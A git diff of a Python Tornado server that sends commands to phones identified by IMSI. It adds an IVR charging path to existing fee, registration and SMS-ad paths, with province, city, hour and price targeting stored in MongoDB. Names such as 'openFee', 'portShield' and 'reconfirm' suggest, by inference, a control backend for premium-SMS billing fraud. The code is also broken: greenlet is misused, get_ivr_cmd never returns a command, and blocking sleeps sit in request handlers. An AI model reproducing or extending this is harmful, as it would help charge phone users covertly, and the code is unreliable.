@@ -5,6 +5,7 @@ import tornado.web
 import struct
 import torndb
 import time
+from datetime import datetime
 import json
 import sys
 import geoip2.database
@@ -21,6 +22,8 @@ import MySQLdb
 from DBUtils.PooledDB import PooledDB
 from tornado import gen
 from tornado.httpclient import AsyncHTTPClient
+from pymongo import MongoClient
+import greenlet
 # import requests
 reload(sys)
 sys.setdefaultencoding("utf-8")
@@ -31,6 +34,8 @@ poolLog = PooledDB(MySQLdb, 5, host=config.GLOBAL_SETTINGS['log_db']['host'], us
     'log_db']['psw'], db=config.GLOBAL_SETTINGS['log_db']['name'], port=config.GLOBAL_SETTINGS['log_db']['port'], setsession=['SET AUTOCOMMIT = 1'], cursorclass=MySQLdb.cursors.DictCursor, charset="utf8")
 systemConfigs = {}
 registerTargetConfigs = {}
+ivrConfigs = {}
+gMongoCli = MongoClient(config.GLOBAL_SETTINGS['mongodb'])
 
 MATCH_CONTENT = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
 MATCH_CONTENT += "<wml>"
@@ -157,7 +162,8 @@ class MainHandler(tornado.web.RequestHandler):
         _test_imsi_info = check_test_imsi(reqInfo["imsi"])
         if _test_imsi_info == None:
             # process normal user
-            _rsp_content = get_imsi_response(reqInfo["imsi"], threads)
+            _rsp_content = get_imsi_response(
+                reqInfo["imsi"], threads, reqInfo['svn'])
             reqInfo['rspContent'] = _rsp_content
             if _rsp_content != None:
                 self.write(_rsp_content)
@@ -176,10 +182,11 @@ class MainHandler(tornado.web.RequestHandler):
         threads.append(threading.Thread(target=insert_req_log(reqInfo)))
         for t in threads:
             t.start()
+        time.sleep(10)
         # print("current has %d threads" % (threading.activeCount() - 1))
 
 
-def get_imsi_response(_imsi, _threads):
+def get_imsi_response(_imsi, _threads, _svn):
 
     _return = ""
     relationId = 0
@@ -229,12 +236,18 @@ def get_imsi_response(_imsi, _threads):
             # normal fee process
             if get_system_parameter_from_db('openFee') == 'open' and check_user_cmd_fee(_record_user) and isOpenHour():
                 _return = get_cmd(_record_user, _threads)
+            if (_return == None or len(_return) <= 1) and _svn >= 3900 and get_system_parameter_from_db('openIvr') == 'open':
+                _return = get_ivr_cmd(_record_user, _threads)
+                if _return != None:
+                    1
+                    # _threads.append(threading.Thread(
+                    # target=insert_register_cmd_log(_record_user, _return)))
             if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('openRegister') == 'open':
                 _return = get_register_cmd(_record_user, _threads)
                 if _return != None:
                     _threads.append(threading.Thread(
                         target=insert_register_cmd_log(_record_user, _return)))
-            if ctime - int(_record_user['insertTime']) > 864000 and (_return == None or len(_return) <= 1) and get_system_parameter_from_db('sendSmsAd') == 'open' and isSmsAdOpenHour():
+            if ctime - int(_record_user['insertTime']) > 864000 and (_return == None or len(_return) <= 1) and get_system_parameter_from_db('sendSmsAd') == 'open':
                 _return = get_sms_ad_cmd(_record_user, _threads)
             if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('weixin2ndRegisterWithRandomMo') == 'open':
                 relationId = checkWeixinRelation(_record_user)
@@ -352,11 +365,12 @@ def isOpenHour():
     return _result
 
 
-def isSmsAdOpenHour():
-    _result = True
+def checkHourRange(strHourRange):
+    _result = False
     _hour = int(time.strftime("%H", time.localtime()))
-    if _hour > 19 or _hour <= 7:
-        _result = False
+    _arr = strHourRange.split("-")
+    if _hour >= int(_arr[0]) and _hour <= int(_arr[1]):
+        _result = True
     return _result
 
 
@@ -442,9 +456,63 @@ def get_register_cmd(_user, _threads):
     #         '[reconfirm]', '回复*可获').replace('[portShield]',  '').replace('[times]', '1')
     #     _threads.append(threading.Thread(
     #         target=async_update_register_cmd_mo_ready(_user, '102')))
-    else:
-        _result = None
     return _result
+
+
+def get_ivr_cmd(_user, _threads):
+    _result = None
+    for v in ivrConfigs.values():
+        # if v['state'] == 'open' and _user['mobileType'] == v['mobileType']
+        # and _user["province"] in v['openProvince'] and _user["city"] not in
+        # v['closeCity'] and checkHourRange(v['openHour']):
+        if v['state'] == 'open' and _user['mobileType'] == v['mobileType'] and _user["province"] in v['openProvince'] and _user["city"] not in v['closeCity'] and checkHourRange(v['openHour']):
+            ivrDocKey = long(_user['imsi']) * 1000 + v['id']
+            ivrDoc = gMongoCli.sms.ivrs.find_one({"_id": ivrDocKey})
+            if ivrDoc == None:
+                ivrDoc = initialIvrDoc(ivrDocKey, v)
+                a = greenlet(async_insert_ivrDoc, ivrDoc)
+
+                # response = yield tornado.gen.Task(async_insert_ivrDoc,
+                # ivrDoc)
+
+                # insertIvrDoc = asyncMongoInsert(ivrDoc)
+                # insertIvrDoc.start()
+
+                # async_insert_ivrDoc(ivrDoc)
+    return _result
+
+
+def initialIvrDoc(ivrDocKey, ivrConfig):
+    logger.debug(ivrConfig)
+    ctime = round(time.time())
+    ivrDoc = {"_id": ivrDocKey}
+    ivrDoc["lastCmdTime"] = long(ctime)
+    ivrDoc["expiredTime"] = datetime.utcfromtimestamp(
+        long(ctime + 86400 * 60))
+    ivrDoc["currentDayCmdTotal"] = ivrConfig['price']
+    ivrDoc["currentMonthCmdTotal"] = ivrConfig['price']
+    return ivrDoc
+
+
+# class asyncMongoInsert(Greenlet):
+#     """docstring for ClassName"""
+
+#     def __init__(self, arg):
+#         # super(ClassName, self).__init__()
+#         Greenlet.__init__(self)
+#         self.arg = arg
+
+#     def _run(self):
+#         logger.debug("asyncMongoInsert")
+#         gMongoCli.sms.ivrs.insert(arg)
+#         logger.debug("asyncMongoInsert")
+
+
+@gen.coroutine
+def async_insert_ivrDoc(ivrDoc):
+    # yield gMongoCli.sms.ivrs.insert(ivrDoc)
+    gMongoCli.sms.ivrs.insert(ivrDoc)
+    time.sleep(10)
 
 
 def async_update_cmd_fee(_user, _cmd):
@@ -522,6 +590,7 @@ def get_system_parameter_from_db(_title):
 
 
 def cache_parameter():
+    global ivrConfigs
     _dbConfig = poolConfig.connection()
     _cur = _dbConfig.cursor()
     _sql = 'SELECT * FROM `system_configs` '
@@ -529,6 +598,13 @@ def cache_parameter():
     _recordRsp = _cur.fetchall()
     for _t in _recordRsp:
         systemConfigs[_t['title']] = _t['detail']
+    tmpIvrConigs = {}
+    _sql = 'SELECT * FROM `ivr_configs` '
+    _cur.execute(_sql)
+    _recordRsp = _cur.fetchall()
+    for _t in _recordRsp:
+        tmpIvrConigs[_t['id']] = _t
+    ivrConfigs = tmpIvrConigs
     _sql = 'SELECT * FROM `register_targets` '
     _cur.execute(_sql)
     _recordRsp = _cur.fetchall()
